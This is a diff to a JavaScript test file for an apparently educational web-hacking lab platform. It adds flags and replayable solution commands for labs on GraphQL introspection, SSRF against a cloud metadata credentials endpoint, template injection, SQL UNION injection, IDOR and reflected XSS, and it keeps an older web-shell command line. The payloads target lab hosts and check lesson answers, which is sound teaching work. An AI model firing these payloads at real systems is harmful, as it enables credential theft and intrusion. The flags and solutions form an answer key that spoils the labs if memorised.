@@ -86,18 +86,62 @@ const LABS = [
       `curl -s 'http://app.lab.local/uploads/ab12cd.php?c=cat flag.txt' | tail -1 > found.txt`,
     ],
   },
+  {
+    id: 'web-graphql-deep', flag: 'nto{1ntr0sp3ct10n_sh0ws_3v3ryth1ng}', hints: 4,
+    solution: [
+      `curl -s -G http://vuln.lab.local/graphql --data-urlencode 'query={__schema{queryType{name}}}'`,
+      `curl -s -G http://vuln.lab.local/graphql --data-urlencode 'query={flag}' | cut -d: -f3 > found.txt`,
+    ],
+  },
+  {
+    id: 'web-ssrf', flag: 'nto{169_254_169_254_1s_my_h0m3}', hints: 4,
+    solution: [
+      `curl -s -G http://vuln.lab.local/fetch --data-urlencode 'url=http://169.254.169.254/latest/meta-data/iam/security-credentials/' | cut -d: -f6 > found.txt`,
+    ],
+  },
+  {
+    id: 'web-ssti', flag: 'nto{t3mpl4t3s_3v4l_3v3ryth1ng}', hints: 4,
+    solution: [
+      `curl -s -G http://vuln.lab.local/render --data-urlencode 'name={{7*7}}'`,
+      `curl -s -G http://vuln.lab.local/render --data-urlencode 'name={{config}}' | grep FLAG | cut -d= -f2 > found.txt`,
+    ],
+  },
+  {
+    id: 'web-sqli', flag: 'nto{m4nu4l_un10n_b34ts_th3_b0t}', hints: 4,
+    solution: [
+      `curl -s 'http://vuln.lab.local/product?id=1 ORDER BY 4'`,
+      `curl -s -G http://vuln.lab.local/product --data-urlencode 'id=1 UNION SELECT 1,value,3 FROM secrets' | grep 'nto{' | cut -d: -f6 > found.txt`,
+    ],
+  },
+  {
+    id: 'web-idor-uuid', flag: 'nto{1d0r_1n_uuid_l4nd}', hints: 4,
+    solution: [
+      `curl -s http://vuln.lab.local/api/user/1`,
+      `curl -s http://vuln.lab.local/api/user/2 | cut -d: -f5 > found.txt`,
+    ],
+  },
+  {
+    id: 'web-xss', flag: '<script>alert(1)</script>', hints: 4, noExpect: true,
+    check: "grep -q '<script>alert(1)</script>' found.txt",
+    solution: [
+      `curl -s -G http://vuln.lab.local/search --data-urlencode 'q=laptop'`,
+      `curl -s -G http://vuln.lab.local/search --data-urlencode 'q=<script>alert(1)</script>' > found.txt`,
+    ],
+  },
 ]
 
-describe.each(LABS)('web lab: $id', ({ id, flag, hints, solution }) => {
+describe.each(LABS)('web lab: $id', ({ id, flag, hints, solution, noExpect, check }) => {
   const bundle = load(id)
-  const spec = { kind: 'shell', workdir: WD, check: CHECK, hints: Array(hints).fill('h') }
+  const spec = { kind: 'shell', workdir: WD, check: check || CHECK, hints: Array(hints).fill('h') }
 
   it('bundle + seed files are consistent with the lesson lab block', () => {
     expect(bundle.id).toBe(id)
     expect(bundle.workdir).toBe(WD)
-    expect(bundle.expect.file).toBe(`${WD}/found.txt`)
-    expect(bundle.expect.contains).toBe(flag)
     expect(bundle.fs.some((f) => f.path === `${WD}/task.md`)).toBe(true)
+    if (!noExpect) {
+      expect(bundle.expect.file).toBe(`${WD}/found.txt`)
+      expect(bundle.expect.contains).toBe(flag)
+    }
   })
 
   it('replays the intended solution and passes check', async () => {
@@ -108,7 +152,7 @@ describe.each(LABS)('web lab: $id', ({ id, flag, hints, solution }) => {
     expect(r.code).toBe(0)
     expect(r.stdout).toContain('Готово')
     expect(s.solved).toBe(true)
-    // the flag really is in found.txt
+    // the answer really is in found.txt
     expect(s.vfs.readText(`${WD}/found.txt`)).toContain(flag)
   })
 
